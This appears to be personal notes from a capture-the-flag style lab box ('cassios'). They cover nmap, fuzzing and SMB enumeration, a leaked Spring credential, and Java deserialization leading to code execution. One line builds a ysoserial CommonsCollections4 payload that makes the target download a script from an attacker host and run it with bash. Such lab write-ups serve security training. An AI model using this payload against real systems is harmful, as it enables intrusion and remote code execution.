# Export
```md
export IP="192.168.96.116"
export URL="http://192.168.96.116:80/FUZZ"
```

<hr>

# Vulnerability
+ Plaintext password found in one of the web application configuration file.
+ SMB anonymous access and write.
+ Java unsafe deserialization.
	+ Payload:
```bash
┌──(root💀jaeng)-[~/Documents/PG/cassios/smb]
└─# java -jar ../ysoserial-master-d367e379d9-1.jar CommonsCollections4 'wget 192.168.49.69:8080/unsafe_deserialize.sh -O /tmp/unsafe_deserialize.sh && bash /tmp/unsafe_deserialize.sh' > recycler.ser
```
+ `sudoedit` Unauthorized Privilege Escalation bug

<hr>

# Credentials Panel
+ (Web 8080): `recycler:DoNotMessWithTheRecycler123`

<hr>

# Nmap
```bash
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 36:cd:06:f8:11:72:6b:29:d8:d8:86:99:00:6b:1d:3a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjISDfZJSrhxHPJNdFOaYN/6v9xvTQ0nvVxY3PC93qraoFeHMiwAYDxzcaY47E965uLcjgBfqicRVIziukrnVDn9R14LZmq74kbAmaf6PcOyjL3iN9uQWE/7umx3rG98dVugfW9SzuHgorDE7anOV8ewsepOSx61qnb0p/p2IID7ExFXgh8UqtMAD1viVHdvOhHFZL4BbzVj57LBaRvEDC2lx8mSvwxRmJyw7Jqm3+S640y6pet4QgLSrWdQt8nh/dW/U9HPkwfqrytd7tdnIRhuR/L+E6H8rKycI/y012pdIlE+wtNY2xgjGm0mQfmVH1sDEN/OGVw7TdH6BEc9x
|   256 7d:12:27:de:dd:4e:8e:88:48:ef:e3:e0:b2:13:42:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC08uXC/2TmrLqWbD0sPKxdflt2pC5fpX9UHyK0G3f/HMGwFQQlpjuBnK8F8piwnSjXyDHRSFGa/bGXi9n3gIf0=
|   256 c4:db:d3:61:af:85:95:0e:59:77:c5:9e:07:0b:2f:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWphiQ1WtEPUDgeKuwnZ018EFPqR/4MiEj85mmMdGvk
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Landed by HTML5 UP
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 (workgroup: SAMBA)
8080/tcp open  http-proxy  syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 08 Aug 2021 02:23:47 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title></title>
|     <link rel="stylesheet" href="/css/main.css">
|     </head>
|     <body>
|     <div class="small-container">
|     <div class="flex-row">
|     <h1>Recycler Management System</h1>
|     </div>
|     <div class="flex-row">
|     <img src="/images/factory.jpg" class="round-button">
|     </div> 
|     </div>
|     <br>
|     <div class="small-container">
|     <div class="flex-small">Control system for the factory
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Sun, 08 Aug 2021 02:23:47 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 08 Aug 2021 02:23:47 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-favicon: Unknown favicon MD5: 4EABB75877508499240896BC9E184C86
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
|_http-trane-info: Problem with XML parsing of /evox/about
```

<hr>

# Web Application
#### Port 80
+ Discovery

```bash
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9]
assets                  [Status: 301, Size: 237, Words: 14, Lines: 8]
backup_migrate          [Status: 301, Size: 245, Words: 14, Lines: 8]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9]
download                [Status: 200, Size: 1479862, Words: 5695, Lines: 5435]
images                  [Status: 301, Size: 237, Words: 14, Lines: 8]
index.html              [Status: 200, Size: 9088, Words: 591, Lines: 217]
```

+ `/backup_migrate` directory contains `recycler.tar` tar file.
+ `recycler.tar` contains the source code of the Recycler Management System website?.
+ `WebSecurityConfig.java` contains web credentials.
```md
...
        @Bean
        @Override
        public UserDetailsService userDetailsService() {
                UserDetails user =
                         User.withDefaultPasswordEncoder()
                                .username("recycler")
                                .password("DoNotMessWithTheRecycler123")
                                .roles("USER")
                                .build();
...
```

+ `DashboardController.java` reveals valid a user `samantha`.

```md
...
String filename = "/home/samantha/backups/recycler.ser";
...
```

+ `/download` contains a `download.zip` zip file - source code of the `port 80` web server. 


#### Port 8080
+ Discovery

```bash
home                    [Status: 200, Size: 746, Words: 47, Lines: 37]
login                   [Status: 200, Size: 1097, Words: 134, Lines: 38]
```

+ Java ver1.8
+ Spring framework
+ Common-Collections4
+ `pom-bak.xml`
```md
...
                    <groupId>org.apache.commons</groupId>
                    <artifactId>commons-collections4</artifactId>
                    <version>4.0</version>
...
```

+ `/check` will deserialize `recycler.ser` → Remote Code Execution
+ `/save` will serialize `recycler.ser`

<hr>

# SMB
+ File shares

```md
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Samantha Konstan Disk      Backups and Recycler files
        IPC$            IPC       IPC Service (Samba 4.10.4)
```

+ `Samantha Konstan` allows anonymous login and also writable

```md
smb: \> ls
  .                                   D        0  Thu Oct  1 16:28:46 2020
  ..                                  D        0  Thu Sep 24 13:38:10 2020
  recycler.ser                        N      145  Sat Aug  7 22:51:50 2021
  readme.txt                          N      478  Thu Sep 24 13:32:50 2020
  spring-mvc-quickstart-archetype      D        0  Thu Sep 24 13:36:11 2020
  thymeleafexamples-layouts           D        0  Thu Sep 24 13:37:09 2020
  resources.html                      N    42713  Thu Sep 24 13:37:41 2020
  pom-bak.xml                         N     2187  Thu Oct  1 16:28:46 2020
```
